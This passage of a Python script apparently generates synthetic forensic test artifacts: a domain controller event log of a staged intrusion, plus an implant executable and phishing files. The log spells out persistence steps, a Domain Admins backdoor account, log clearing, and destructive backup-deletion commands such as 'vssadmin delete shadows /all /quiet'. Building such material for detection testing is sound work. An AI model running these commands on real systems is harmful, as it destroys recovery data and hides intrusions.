      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4964</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:39.500Z" />
      <EventRecordID>8011</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">svc_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="SpecialGroupName">Domain Admins</Data>
      <Data Name="SpecialGroupSid">S-1-5-21-397955417-626881126-188441454-512</Data>
    </EventData>
  </Event>

  <!-- 31. Network Share Object Accessed: ADMIN$ (5140) at 10:00:40Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>5140</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:40.000Z" />
      <EventRecordID>8012</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="ShareName">\\\\*\\ADMIN$</Data>
    </EventData>
  </Event>

  <!-- 32. Network Share Detailed Access Check: beacon_updater.exe (5145) at 10:00:41Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>5145</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:41.000Z" />
      <EventRecordID>8013</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="ShareName">\\\\*\\ADMIN$</Data>
      <Data Name="RelativeTargetName">System32\\beacon_updater.exe</Data>
      <Data Name="AccessMask">0x12019F</Data>
    </EventData>
  </Event>

  <!-- 33. Network Share Object Accessed: C$ (5140) at 10:00:42Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>5140</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:42.000Z" />
      <EventRecordID>8014</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="ShareName">\\\\*\\C$</Data>
    </EventData>
  </Event>

  <!-- 34. Network Share Detailed Access Check: PSEXESVC.exe (5145) at 10:00:43Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>5145</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:43.000Z" />
      <EventRecordID>8015</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="ShareName">\\\\*\\ADMIN$</Data>
      <Data Name="RelativeTargetName">System32\\PSEXESVC.exe</Data>
      <Data Name="AccessMask">0x12019F</Data>
    </EventData>
  </Event>

  <!-- 35. Lateral Movement Persistence: Remote Service Installed (7045) at 10:00:45Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" Guid="{{555908d1-a6d7-4695-8e1e-26931d2012f4}}" />
      <EventID>7045</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:45.000Z" />
      <EventRecordID>8016</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="ServiceName">WindowsDefendUpdateSvc</Data>
      <Data Name="ImagePath">C:\\Windows\\System32\\beacon_updater.exe --service</Data>
      <Data Name="ServiceType">user mode service</Data>
      <Data Name="StartType">auto start</Data>
      <Data Name="AccountName">LocalSystem</Data>
    </EventData>
  </Event>

  <!-- 36. Lateral Movement Service Installed: PSEXESVC (7045) at 10:00:46Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7045</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:46.000Z" />
      <EventRecordID>8017</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="ServiceName">PSEXESVC</Data>
      <Data Name="ImagePath">%SystemRoot%\\PSEXESVC.exe</Data>
      <Data Name="ServiceType">user mode service</Data>
      <Data Name="StartType">demand start</Data>
      <Data Name="AccountName">LocalSystem</Data>
    </EventData>
  </Event>

  <!-- 37. Process Creation (4688) of beacon_updater.exe on DC-PROD-01 at 10:00:50Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:50.000Z" />
      <EventRecordID>8018</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\beacon_updater.exe</Data>
      <Data Name="CommandLine">"C:\\Windows\\System32\\beacon_updater.exe" --service</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\services.exe</Data>
      <Data Name="Hashes">MD5={PE_MD5},SHA256={PE_SHA256}</Data>
    </EventData>
  </Event>

  <!-- 38. Process Creation: Reconnaissance whoami /priv (4688) at 10:00:52Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:52.000Z" />
      <EventRecordID>8019</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
      <Data Name="CommandLine">cmd.exe /c whoami /priv</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 39. Active Directory Backdoor: User Account Created svc_backdoor (4720) at 10:00:54Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4720</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:54.000Z" />
      <EventRecordID>8020</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">svc_backdoor</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="SamAccountName">svc_backdoor</Data>
    </EventData>
  </Event>

  <!-- 40. Active Directory Backdoor: User Account Enabled (4722) at 10:00:55Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4722</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:55.000Z" />
      <EventRecordID>8021</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">svc_backdoor</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="SubjectUserName">svc_admin</Data>
    </EventData>
  </Event>

  <!-- 41. Active Directory Backdoor: Password Set to Never Expire (4738) at 10:00:56Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4738</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:56.000Z" />
      <EventRecordID>8022</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">svc_backdoor</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="UserAccountControl">%%2089</Data>
    </EventData>
  </Event>

  <!-- 42. Active Directory Backdoor: Added to Domain Admins (4728) at 10:00:57Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4728</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:57.000Z" />
      <EventRecordID>8023</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="MemberName">CN=svc_backdoor,CN=Users,DC=target,DC=local</Data>
      <Data Name="MemberSid">S-1-5-21-397955417-626881126-188441454-1105</Data>
      <Data Name="TargetUserName">Domain Admins</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="TargetSid">S-1-5-21-397955417-626881126-188441454-512</Data>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
    </EventData>
  </Event>

  <!-- 43. Active Directory Backdoor: Added to Local Administrators (4732) at 10:00:58Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4732</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:58.000Z" />
      <EventRecordID>8024</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="MemberName">CN=svc_backdoor,CN=Users,DC=target,DC=local</Data>
      <Data Name="MemberSid">S-1-5-21-397955417-626881126-188441454-1105</Data>
      <Data Name="TargetUserName">Administrators</Data>
      <Data Name="TargetDomainName">Builtin</Data>
      <Data Name="TargetSid">S-1-5-32-544</Data>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
    </EventData>
  </Event>

  <!-- 44. Scheduled Task Persistence: UpdateTask Created (4698) at 10:01:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4698</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:05.000Z" />
      <EventRecordID>8025</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="TaskName">\\Microsoft\\Windows\\Maintenance\\UpdateTask</Data>
      <Data Name="TaskContent">&lt;Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;C:\\Windows\\System32\\beacon_updater.exe&lt;/Command&gt;&lt;Arguments&gt;--periodic&lt;/Arguments&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data>
    </EventData>
  </Event>

  <!-- 45. Ransomware Activity: Volume Shadow Copies Deletion (4688) at 10:01:20Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:20.000Z" />
      <EventRecordID>8026</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\vssadmin.exe</Data>
      <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>

  <!-- 46. Ransomware Activity: WMIC Shadowcopy Delete (4688) at 10:01:21Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:21.000Z" />
      <EventRecordID>8027</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\wbem\\wmic.exe</Data>
      <Data Name="CommandLine">wmic.exe shadowcopy delete</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>

  <!-- 47. Ransomware Activity: Disaster Recovery Disabled (4688) at 10:01:22Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:22.000Z" />
      <EventRecordID>8028</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\bcdedit.exe</Data>
      <Data Name="CommandLine">bcdedit.exe /set {{default}} recoveryenabled No</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>

  <!-- 48. Ransomware Activity: Boot Status Policy Ignore Failures (4688) at 10:01:23Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:23.000Z" />
      <EventRecordID>8029</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\bcdedit.exe</Data>
      <Data Name="CommandLine">bcdedit.exe /set {{default}} bootstatuspolicy ignoreallfailures</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>

  <!-- 49. Ransomware Activity: System State Backup Deletion via wbadmin (4688) at 10:01:24Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:24.000Z" />
      <EventRecordID>8030</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\wbadmin.exe</Data>
      <Data Name="CommandLine">wbadmin.exe delete systemstatebackup -keepVersions:0</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>

  <!-- 50. Process Terminated: beacon_updater.exe (4689) at 10:01:28Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4689</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:28.000Z" />
      <EventRecordID>8031</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="ProcessName">C:\\Windows\\System32\\beacon_updater.exe</Data>
      <Data Name="Status">0x0</Data>
    </EventData>
  </Event>

  <!-- 51. Anti-Forensics: Security Audit Log Cleared (1102) at 10:01:30Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>1102</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:30.000Z" />
      <EventRecordID>8032</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <UserData>
      <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
        <SubjectUserName>svc_admin</SubjectUserName>
        <SubjectDomainName>TARGET</SubjectDomainName>
      </LogFileCleared>
    </UserData>
  </Event>
</Events>"""

    with open(out_file, "w", encoding="utf-8") as f:
        f.write(xml_content)
    print(f"[+] Successfully wrote Host B EVTX: {out_file}")

# -------------------------------------------------------------------------
# Main Execution
# -------------------------------------------------------------------------
if __name__ == "__main__":
    import shutil
    print("[=== Generating Correlated Attack Scenario Files ===]")
    build_pcap()
    build_host_a_evtx()
    build_host_b_evtx()

    # 03_c2_implant_beacon.exe
    pe_file = os.path.join(OUT_DIR, "03_c2_implant_beacon.exe")
    with open(pe_file, "wb") as f:
        f.write(PE_BYTES)
    print(f"[+] Successfully wrote Staged PE: {pe_file}")

    # 07_exfiltrated_archive.zip
    zip_file = os.path.join(OUT_DIR, "07_exfiltrated_archive.zip")
    with open(zip_file, "wb") as f:
        f.write(ZIP_BYTES)
    print(f"[+] Successfully wrote Exfil Zip: {zip_file}")

    # 01_phishing_email.msg
    msg_src = "test-files/invoice_with_macro_attachment.msg"
    if os.path.exists(msg_src):
        shutil.copy2(msg_src, os.path.join(OUT_DIR, "01_phishing_email.msg"))
        print(f"[+] Successfully wrote Phishing Email: {os.path.join(OUT_DIR, '01_phishing_email.msg')}")

    # 02_weaponized_document.docm
    docm_src = "test-files/office_vba_macro_template_injection.docm"
    if os.path.exists(docm_src):
        shutil.copy2(docm_src, os.path.join(OUT_DIR, "02_weaponized_document.docm"))
        print(f"[+] Successfully wrote Weaponized Doc: {os.path.join(OUT_DIR, '02_weaponized_document.docm')}")

    print("[=== All 7 Correlated Artifacts Generated Successfully ===]")
